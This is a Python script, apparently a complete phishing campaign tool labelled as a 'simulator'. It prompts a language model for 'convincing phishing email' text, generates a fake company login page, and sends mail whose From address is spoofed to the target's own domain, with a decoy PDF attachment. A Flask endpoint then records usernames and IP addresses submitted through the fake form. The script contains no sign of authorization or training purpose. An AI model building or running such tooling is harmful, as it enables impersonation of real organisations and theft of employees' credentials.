import os
import random
import logging
import sendgrid
from sendgrid.helpers.mail import Mail, Email, To, Content, Attachment, FileContent, FileName, FileType, Disposition
import openai
from flask import Flask, request
import base64
from datetime import datetime
import json

# Configure Logging
logging.basicConfig(filename='phishing_campaign.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class PhishingSimulator:
    def __init__(self, openai_api_key, sendgrid_api_key):
        self.openai_api_key = openai_api_key
        self.sendgrid_api_key = sendgrid_api_key
        openai.api_key = self.openai_api_key
        self.sg = sendgrid.SendGridAPIClient(api_key=self.sendgrid_api_key)

    def generate_email_content(self, target_info):
        topics = ["account verification", "security update", "password reset", "urgent account action", "data breach notification"]
        chosen_topic = random.choice(topics)
        prompt = f"Write a convincing phishing email targeted at employees of {target_info['company']} regarding a {chosen_topic}. Include a sense of urgency and a call to action."
        
        try:
            response = openai.Completion.create(
                engine="text-davinci-003", 
                prompt=prompt,
                max_tokens=300,
                temperature=0.7
            )
            return response.choices[0].text.strip()
        except Exception as e:
            logging.error(f"Error generating email content: {str(e)}")
            return None

    def create_fake_login_page(self, target_company):
        fake_page = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{target_company} - Security Alert</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f4f4f4; }}
                .container {{ max-width: 400px; margin: 0 auto; background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h2 {{ color: #333; }}
                input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }}
                input[type="submit"] {{ width: 100%; padding: 10px; background-color: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }}
                input[type="submit"]:hover {{ background-color: #0056b3; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>{target_company} - Security Alert</h2>
                <p>Your account has been temporarily locked due to suspicious activity. Please log in to verify your information and restore access.</p>
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="submit" value="Secure Login">
                </form>
            </div>
        </body>
        </html>
        """
        return fake_page

    def send_phishing_email(self, target_email, content, fake_page_url):
        from_email = Email("security@" + target_email.split('@')[1])
        to_email = To(target_email)
        subject = "Urgent: Account Security Alert - Immediate Action Required"
        
        body = content + f"\n\nSecure your account here: {fake_page_url}"
        content = Content("text/html", body)
        
        mail = Mail(from_email, to_email, subject, content)

        # Add a fake attachment to make it more convincing
        attachment = Attachment()
        file_content = base64.b64encode(b"This is a fake attachment").decode()
        attachment.file_content = FileContent(file_content)
        attachment.file_type = FileType("application/pdf")
        attachment.file_name = FileName("Security_Update.pdf")
        attachment.disposition = Disposition("attachment")
        mail.attachment = attachment

        try:
            response = self.sg.send(mail)
            self.log_email_activity(target_email, "Sent", response.status_code)
            return response.status_code
        except Exception as e:
            logging.error(f"Error sending email to {target_email}: {str(e)}")
            return None

    def log_email_activity(self, target_email, status, response_code=None):
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "target_email": target_email,
            "status": status,
            "response_code": response_code
        }
        logging.info(json.dumps(log_entry))

    def run_campaign(self, target_list):
        results = []
        for target in target_list:
            content = self.generate_email_content(target)
            if content:
                fake_page = self.create_fake_login_page(target['company'])
                fake_page_url = f"https://your-server.com/{target['company'].lower().replace(' ', '_')}_login.html"
                status_code = self.send_phishing_email(target['email'], content, fake_page_url)
                results.append({
                    "email": target['email'],
                    "status": "Sent" if status_code == 202 else "Failed",
                    "status_code": status_code
                })
                print(f"Phishing email {'sent to' if status_code == 202 else 'failed for'} {target['email']}")
            else:
                results.append({
                    "email": target['email'],
                    "status": "Failed",
                    "reason": "Content generation failed"
                })
                print(f"Failed to generate content for {target['email']}")
        return results

# Flask app to simulate the phishing server
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def capture_login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    
    # Log interaction (do not store sensitive data)
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "username": username,
        "ip_address": ip_address
    }
    logging.info(f"Login attempt: {json.dumps(log_entry)}")
    
    # Return a simple response
    return "Login attempt recorded", 200

# Usage Example
if __name__ == '__main__':
    openai_api_key = os.getenv("OPENAI_API_KEY")
    sendgrid_api_key = os.getenv("SENDGRID_API_KEY")
    simulator = PhishingSimulator(openai_api_key, sendgrid_api_key)
    targets = [
        {"email": "employee1@company.com", "company": "TechCorp"},
        {"email": "employee2@company.com", "company": "TechCorp"},
    ]
    campaign_results = simulator.run_campaign(targets)
    print("Campaign Results:", campaign_results)

    # Start the Flask server to capture login attempts
    app.run(debug=True)